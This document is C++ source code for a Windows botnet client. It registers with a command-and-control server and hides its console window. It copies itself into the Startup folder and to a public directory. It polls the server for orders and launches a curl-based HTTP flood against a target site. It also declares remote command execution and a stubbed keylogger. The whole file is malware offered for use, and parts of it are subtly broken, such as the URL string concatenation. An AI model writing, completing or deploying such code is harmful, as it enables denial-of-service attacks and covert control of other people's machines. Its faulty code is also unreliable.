#include <bits/stdc++.h>
#include <windows.h>
#include <unistd.h>
#include <thread>
#include <atomic>
#include <filesystem>
#include <fstream>

#define SERVER_URL "http://yourserver.com"  // Replace with your PHP server URL
#define ATTACK_INTERVAL 60  // Seconds between attack checks
#define MAX_RETRIES 3  // Max retries before stopping

using namespace std;
namespace fs = std::filesystem;

atomic<bool> isAttacking(false);  // Shared state for attack status

// Function declarations
void runInBackground();
void saveStartup();
string makeRequest(string method, string uri);
void startDDOS(string link, string iterations);
string randomString(int n);
void registerBot();
void getCommand();
void updateBotStatus();
void handleAttack();
void handleStatus();
void replicateBot();  // Self-replication function
void logKeystrokes();  // Keystroke logging function
void executeRemoteCommand(string cmd);  // Execute system commands remotely

// Global variables
string link;
string iterations;
string bot_id;

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main() {
    bot_id = randomString(6);
    registerBot();

    // Run in background and save to startup
    runInBackground();
    saveStartup();

    // Launch threads for attack and status handling
    thread attackThread(handleAttack);
    thread statusThread(handleStatus);

    // Run self-replication in the background
    thread replicationThread(replicateBot);
    
    // Optionally, start logging keystrokes
    thread keyloggerThread(logKeystrokes);

    attackThread.join();
    statusThread.join();
    replicationThread.join();
    keyloggerThread.join();

    return 0;
}

// Register bot with the server
void registerBot() {
    string url = SERVER_URL + "/bot_register.php?bot_id=" + bot_id;
    makeRequest("GET", url);
    cout << "Bot registered with server." << endl;
}

// Function to execute commands on the system (remote control)
void executeRemoteCommand(string cmd) {
    string response = exec(cmd.c_str());
    cout << "Executed: " << cmd << " Response: " << response << endl;
}

// Handle DDoS attack commands
void getCommand() {
    string url = SERVER_URL + "/index.php?bot_id=" + bot_id + "&action=attack";
    string response = makeRequest("GET", url);
    if (response == "1") {
        cout << "Start attack!" << endl;
        link = "http://target.com";  // Attack link
        iterations = "1000";  // Attack iterations
        startDDOS(link, iterations);
    }
}

// Make HTTP requests to the server
string makeRequest(string method, string uri) {
    string retval;
    string cmd_for_get_request = "curl -X " + method + " " + SERVER_URL + "/" + uri;
    const char *cmd_for_get_request_p = cmd_for_get_request.c_str();
    
    retval = exec(cmd_for_get_request_p);
    return retval;
}

// Perform DDoS attack
void startDDOS(string link, string iterations) {
    string ddos_cmd = "curl -s \"" + link + "?[0-" + iterations + "]\"";
    const char *ddos_cmd_p = ddos_cmd.c_str();
    system(ddos_cmd_p);
}

// Run process in background
void runInBackground() {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

// Save to startup folder
void saveStartup() {
    string startup_directory = "\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
    string dir_place_worm = startup_directory + "\\bot.exe";
    string cmd_copy_worm_startup = "xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
    system(cmd_copy_worm_startup_p);
}

// Generate a random string for bot ID
string randomString(int n) {
    char alphabet[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 
                          'h', 'i', 'j', 'k', 'l', 'm', 'n',  
                          'o', 'p', 'q', 'r', 's', 't', 'u', 
                          'v', 'w', 'x', 'y', 'z' };

    string res = "";
    for (int i = 0; i < n; i++)  
        res = res + alphabet[rand() % 26];

    return res;
}

// Replicate the bot to other locations or drives
void replicateBot() {
    // Look for external drives or other locations to replicate the bot
    string path = "C:\\Users\\Public";  // Change to targeted directory
    fs::copy("bot.exe", path + "\\bot.exe", fs::copy_options::overwrite_existing);
    cout << "Bot replicated to: " << path << endl;
}

// Log keystrokes ()
void logKeystrokes() {
    // Log keystrokes using low-level hooks ()
    // This is just a placeholder. 
    while (true) {
        // Example: capture and log key presses (simplified)
        Sleep(1000); // Delay to simulate action
        cout << "Logging keystrokes (simulated)" << endl;
    }
}

// Send status updates to the server
void updateBotStatus() {
    string status = "Bot active";
    string url = SERVER_URL + "/index.php?bot_id=" + bot_id + "&action=update_status&status=" + status;
    makeRequest("GET", url);
}

// Handle attack commands in separate thread
void handleAttack() {
    while (true) {
        getCommand();  // Poll for attack commands
        this_thread::sleep_for(chrono::seconds(ATTACK_INTERVAL));  // Wait for next attack check
    }
}

// Periodically send status updates in separate thread
void handleStatus() {
    while (true) {
        updateBotStatus();  // Send bot status
        this_thread::sleep_for(chrono::minutes(1));  // Update every minute
    }
}
